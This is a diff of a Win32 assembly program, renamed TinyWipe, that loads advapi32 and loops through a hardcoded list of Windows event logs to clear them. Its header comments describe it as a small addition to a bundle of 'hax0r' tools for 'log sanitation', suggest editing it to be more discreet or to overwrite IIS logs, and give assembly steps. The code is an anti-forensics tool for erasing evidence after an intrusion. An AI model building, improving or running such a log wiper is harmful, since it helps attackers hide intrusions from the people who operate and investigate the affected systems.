@@ -1,21 +1,29 @@
-;                          -=[    Sarau     ]=-
-;                          -=[     by       ]=-
+;                          -=[   TinyWipe   ]=-
+;                          -=[      by      ]=-
 ;                          -=[   Red Skäl   ]=-
 
-; This was coded circa 2010 - probably before that. At the time I couldn't
-; find an open-source log cleaner for Windows. I decided to write this
-; simple little piece of code.
+; TinyWipe is just a reaction of the sparse Win32 log wipers.  I had looked for
+; ages and couldn't find one when I needed one.  Soon after I found several.  All
+; of which were programmed in C.  And although this program was written more as
+; an exercise in win32asm for me, I thought there were benefits to having this
+; done in asm:
+;      1) The .EXE will be smaller, effectively cutting down the size of your
+;         bundle of 'hax0r' tools.
+;      2) And the less time spent on uploads and the more on log sanitation the
+;         better.
 
-; As it's written in asm it's fairly compact (1650 byte EXE). Or as
-; compact as my messy coding can get it anyway. There is no visual feedback
-; from it. I may change that if I ever decide to rework this.
+; The log names are hardcoded and it will loop to clear them all.  So you'll have
+; to change that yourself if you want to be more discreet.  I may update this in
+; the future and make it so you can choose the specific log files.  And maybe
+; overwrite parts of the IIS logs?
 
-;    > nasmw -fwin32 sarau.asm
-;    > alink sarau.obj win32.lib -entry _start -subsys win -oPE
-; You need to enable the write bit on the code segment for this to run.
-
-; * RUN AS ADMIN *
-; Tested successfully on Vista (32bit) and Win10 (64bit)
+; To assemble:
+;    C:\nasm> nasmw -fwin32 tinywipe.asm
+;    C:\nasm> alink tinywipe.obj win32.lib -entry _start -subsys win -oPE
+; After this you need to enable the Write bit in the
+; header of the code section.  I personally use LordPE
+; so I can use the "Rebuild PE" function at the same
+; time.
 
       [bits 32]
       [extern LoadLibraryA]
@@ -27,28 +35,35 @@
 ; ReadEventLog(hLog,EVENTLOG_FORWARDS_READ|EVENTLOG_SEQUENTIAL_READ,0,evtlogrec,sizeof(buff),(int)read,(int)needed);
 
 _start:
+       ;lea ebx, [szDLL]
        push szDLL
        call LoadLibraryA
        mov [hAdvapi32], eax
        
+       ;lea ebx, [szOEL]
        push szOEL
        push eax                        ; eax = advapi32.dll handle
        call GetProcAddress
        mov dword [OpenEventLog], eax
 
+       ;lea ebx, [szClEL]
        push szClEL
+       ;lea ebx, [hEvtLog]
        push dword [hAdvapi32]
        call GetProcAddress
        mov dword [ClearEventLog], eax
 
+       ;lea ebx, [szCEL]
        push szCEL
+       ;lea ebx, [hEvtLog]
        push dword [hAdvapi32]
        call GetProcAddress
        mov dword [CloseEventLog], eax
 
        cld
        mov esi, dword pNames
-
+       jmp .main_loop
+       db 'R.I.P Steve Irwin - A True Legend',0
  .main_loop:
        lodsd
        cmp dword eax, 0
